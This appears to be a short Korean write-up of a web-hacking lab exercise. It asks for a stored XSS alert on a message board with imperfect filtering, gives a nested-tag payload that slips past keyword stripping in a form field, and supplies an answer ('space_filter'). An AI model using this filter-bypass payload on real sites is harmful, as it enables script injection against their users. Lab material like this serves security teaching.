@@ -1,0 +1,8 @@
+완벽하지 않은 XSS 보안 조치를 취한 해당 게시판에서 Stored XSS를 통하여 'XSS' 메시지를 띄우시오.
+
+------WebKitFormBoundarywrSvkS5HyIt28zP0
+Content-Disposition: form-data; name="content"
+
+<p>test<scrscriptipt>alalertert('XSS')</scrscriptipt></p>
+
+정답 : space_filter
